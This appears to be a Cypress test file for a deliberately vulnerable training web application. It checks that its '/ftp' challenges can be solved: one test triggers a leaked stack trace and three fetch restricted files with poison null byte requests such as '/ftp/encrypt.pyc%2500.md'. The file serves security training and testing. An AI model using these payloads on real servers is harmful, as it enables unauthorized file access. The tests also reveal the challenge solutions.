describe('/ftp', () => {
  describe('challenge "errorHandling"', () => {
    it('should leak information through error message accessing /ftp/easter.egg due to wrong file suffix', () => {
      cy.visit('/ftp/easter.egg', { failOnStatusCode: false })

      cy.get('#stacktrace').then((elements) => {
        // eslint-disable-next-line @typescript-eslint/no-unused-expressions
        expect(!!elements.length).to.be.true
      })
      cy.expectChallengeSolved({ challenge: 'Error Handling' })
    })
  })

  describe('challenge "easterEgg1"', () => {
    it('should be able to access file /ftp/easter.egg with poison null byte attack', () => {
      cy.request('/ftp/eastere.gg%2500.md')
      cy.expectChallengeSolved({ challenge: 'Easter Egg' })
    })
  })

  describe('challenge "misplacedSiemFileChallenge"', () => {
    it('should be able to access file /ftp/suspicious_errors.yml with poison null byte attack', () => {
      cy.request('/ftp/suspicious_errors.yml%2500.md')
      cy.expectChallengeSolved({ challenge: 'Misplaced Signature File' })
    })
  })

  describe('challenge "nullByteChallenge"', () => {
    it('should be able to access file other than Markdown or PDF in /ftp with poison null byte attack', () => {
      cy.request('/ftp/encrypt.pyc%2500.md')
      cy.expectChallengeSolved({ challenge: 'Poison Null Byte' })
    })
  })
})
